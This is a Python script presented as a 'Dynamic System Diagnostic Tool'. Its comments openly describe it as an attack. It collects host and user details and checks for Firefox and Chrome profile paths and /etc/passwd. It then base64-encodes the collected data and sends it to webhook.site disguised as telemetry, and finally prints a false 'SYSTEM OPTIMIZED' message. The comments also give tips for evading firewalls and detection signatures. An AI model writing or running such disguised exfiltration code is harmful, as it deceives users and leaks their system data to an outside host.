import os
import platform
import time
import json
import base64
import http.client

def audit_host_identity():
    print("[+] Initializing Diagnostic Service...")
    # ACTION 1: Environment Fingerprinting (Reconnaissance)
    # Gathering hardware and user info to identify if it's a VM or real target.
    sys_info = {
        "os": platform.system(),
        "node": platform.node(),
        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
        "env": list(os.environ.keys())
    }
    print(f"[*] Host Identity: {sys_info['node']} | User: {sys_info['user']}")
    return sys_info

def capture_browser_artifacts():
    print("[+] Checking browser integrity...")
    # ACTION 2: Targeted Path Traversal
    # Looking for sensitive paths where browsers store history/cookies.
    # Note: We aren't reading the data, just proving we can find the path.
    paths_to_check = [
        os.path.expanduser('~/.mozilla/firefox/'),
        os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default/'),
        "/etc/passwd"
    ]
    
    found = []
    for path in paths_to_check:
        if os.path.exists(path):
            found.append(path)
            print(f"[!] Vulnerability: Accessible sensitive path found -> {path}")
    return found

def transmit_telemetry(data):
    # ACTION 3: Covert Data Exfiltration (DNS/HTTP Tunneling Simulation)
    # Sending system info to a remote server disguised as 'telemetry'.
    print("[+] Syncing diagnostic telemetry with cloud...")
    
    # Base64 encoding hides the 'meaning' of the data from simple firewalls.
    encoded_data = base64.b64encode(str(data).encode()).decode()
    
    try:
        # Using built-in http.client to avoid 'requests' signatures.
        conn = http.client.HTTPConnection("webhook.site", timeout=5)
        # In a real attack, the data is appended to the URL or header.
        conn.request("GET", f"/v1/telemetry?data={encoded_data[:50]}")
        conn.close()
        print("[*] Telemetry sync successful.")
    except Exception:
        print("[-] Cloud sync unavailable. Retrying in background.")

if __name__ == "__main__":
    print("=== DYNAMIC SYSTEM DIAGNOSTIC TOOL v3.1.2 ===")
    
    identity = audit_host_identity()
    time.sleep(1.5) # Wait to mimic real processing
    
    artifacts = capture_browser_artifacts()
    
    # If we found sensitive paths, "exfiltrate" the identity info.
    if artifacts:
        transmit_telemetry(identity)
    
    print("=== DIAGNOSTIC COMPLETE: SYSTEM OPTIMIZED ===")
